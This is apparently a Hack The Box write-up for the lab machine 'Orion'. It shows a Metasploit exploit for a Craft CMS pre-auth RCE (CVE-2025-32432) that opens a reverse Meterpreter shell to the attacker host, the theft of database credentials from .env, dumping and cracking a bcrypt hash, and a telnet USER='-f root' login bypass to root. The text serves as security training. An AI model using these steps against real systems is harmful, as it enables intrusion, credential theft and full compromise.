# Orion - Hack The Box Writeup

## Introduction
**Orion** is an easy-difficulty Linux machine on Hack The Box. Initial foothold is gained by identifying an exposed Craft CMS administrative login exposing version 5.6.16, which is vulnerable to Remote Code Execution via an image transform exploit (CVE-2025-32432). 

Lateral movement involves extracting database credentials from the local `.env` configuration file, retrieving the bcrypt password hash for user `adam` from the MariaDB database, and cracking it with Hashcat to establish an SSH session. 

Privilege escalation is achieved by identifying a local Telnet service running GNU inetutils 2.7 and abusing authentication bypass via argument injection in the `USER` environment variable (`USER='-f root'`) to obtain an interactive root shell.

### Attack Summary Table
| Metric / Phase | Details |
| --- | --- |
| **Target IP** | `10.129.88.210` |
| **OS** | Linux |
| **Initial Access** | Craft CMS Image Transform Pre-auth RCE (CVE-2025-32432) |
| **Lateral Movement** | `.env` DB Credentials -> MariaDB bcrypt Hash Dump -> Hashcat Cracking (`darkangel`) -> SSH (`adam`) |
| **Privilege Escalation** | GNU inetutils Telnet Login Flag Injection (`USER='-f root' telnet -a 127.0.0.1`) |

---

## Reconnaissance

### Port Scanning
A full TCP port scan was performed to identify active services and open ports:

```bash
nmap 10.129.88.210 -p- -n -Pn --min-rate 3000 -vvv -oN fast_scan
```

```text
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack
```

---

## Initial Access

### Web Enumeration
Navigating to `http://10.129.88.210` triggered a redirect to `http://orion.htb`. The domain name was appended to `/etc/hosts` for proper name resolution:

```bash
echo "10.129.88.210 orion.htb" | sudo tee -a /etc/hosts
```

Directory fuzzing was conducted against `http://orion.htb` using `wfuzz`:

```bash
wfuzz -c -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -u http://orion.htb/FUZZ --hc 404
```

```text
000000259:   302        0 L      0 W        0 Ch        "admin"                                                                                                                      
000000291:   301        7 L      12 W       178 Ch      "assets" 
```

Browsing to `/admin` revealed the Orion Telecom Administration portal running **Craft CMS 5.6.16**:

![[Orion-1788370741652.webp|256]]

### Remote Code Execution (CVE-2025-32432)
Researching vulnerabilities for Craft CMS 5.6.16 revealed **CVE-2025-32432**, a pre-authentication Remote Code Execution vulnerability affecting the image transform functionality. A dedicated Metasploit module is available:

```bash
msfconsole -q
msf6 > search craftcms
```

```text
Matching Modules
================

   #  Name                                                    Disclosure Date  Rank       Check  Description
   -  ----                                                    ---------------  ----       -----  -----------
   0  exploit/linux/http/craftcms_preauth_rce_cve_2025_32432  2025-04-14       excellent  Yes    Craft CMS Image Transform Preauth RCE (CVE-2025-32432)
   1    \_ target: PHP In-Memory
```

Configuring the target options and running the module successfully spawned a Meterpreter session:

```bash
msf6 > use exploit/linux/http/craftcms_preauth_rce_cve_2025_32432
msf6 exploit(linux/http/craftcms_preauth_rce_cve_2025_32432) > set RHOSTS 10.129.88.210
msf6 exploit(linux/http/craftcms_preauth_rce_cve_2025_32432) > set VHOST orion.htb
msf6 exploit(linux/http/craftcms_preauth_rce_cve_2025_32432) > set LHOST 10.10.14.53
msf6 exploit(linux/http/craftcms_preauth_rce_cve_2025_32432) > run
```

```text
[*] Started reverse TCP handler on 10.10.14.53:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] Leaked session.save_path: /var/lib/php/sessions
[+] The target is vulnerable. Session path leaked
[*] Injecting stub & triggering payload...
[*] Sending stage (45739 bytes) to 10.129.88.210
[*] Meterpreter session 1 opened (10.10.14.53:4444 -> 10.129.88.210:58096) at 2026-09-02 19:41:38 +0200
```

Dropping into a system shell confirmed execution as the `www-data` user:

```bash
(Meterpreter 1)(/var/www/html/craft/web) > shell
Process 3517 created.
Channel 0 created.
whoami
```

```text
www-data
```

---

## Lateral Movement

### Database Credentials Extraction
Inspecting the application configuration files in `/var/www/html/craft` revealed cleartext database credentials in `.env`:

```bash
cat /var/www/html/craft/.env
```

```text
CRAFT_DB_USER=root
CRAFT_DB_PASSWORD=SuperSecureCraft123Pass!
```

### MariaDB Hash Extraction
Using the recovered database root credentials, an interactive query was executed against the local MariaDB instance to extract user records from the `orion` database:

```bash
mysql -u root -p'SuperSecureCraft123Pass!' -D orion
```

```sql
MariaDB [orion]> SELECT * FROM users;
```

```text
|  1 | admin | adam@orion.htb | $2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS | 2026-03-12 |
```

The hash prefix `$2y$` identifies the algorithm as **bcrypt** with a cost factor of 13.

### Hash Cracking & SSH Access
The hash was cracked using Hashcat with mode `3200` (`bcrypt` / `Blowfish`) and the `rockyou.txt` wordlist:

```bash
hashcat -m 3200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

```text
$2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS:darkangel
```

With the plaintext password `darkangel` obtained, SSH authentication was successful as the user `adam`:

```bash
ssh adam@10.129.88.210
```

---

## Privilege Escalation

### Local Service Enumeration
After standard privilege escalation checks (sudo privileges, SUID/SGID binaries, Linux capabilities, and sensitive files) returned no findings, local network listeners were investigated:

```bash
adam@orion:~$ ss -tuln
```

```text
State      Recv-Q Send-Q Local Address:Port               Peer Address:Port
LISTEN     0      10         127.0.0.1:23                      0.0.0.0:*
```

Port 23 (Telnet) was listening exclusively on `localhost`. Checking the binary version:

```bash
adam@orion:~$ telnet --version
```

```text
telnet (GNU inetutils) 2.7
```

### GNU inetutils Telnet Exploitation
GNU inetutils `telnet` allows passing arbitrary flags to `/bin/login` when automatic login (`-a`) is enabled. By injecting `-f root` into the `USER` environment variable, the client passes `-f root` to `login`, forcing authentication bypass as root without requiring a password:

```bash
adam@orion:~$ USER='-f root' telnet -a 127.0.0.1
```

```text
Trying 127.0.0.1...
Connected to 127.0.0.1.
Escape character is '^]'.

Linux 5.15.0-177-generic (orion) (pts/4)

root@orion:~# whoami
root
```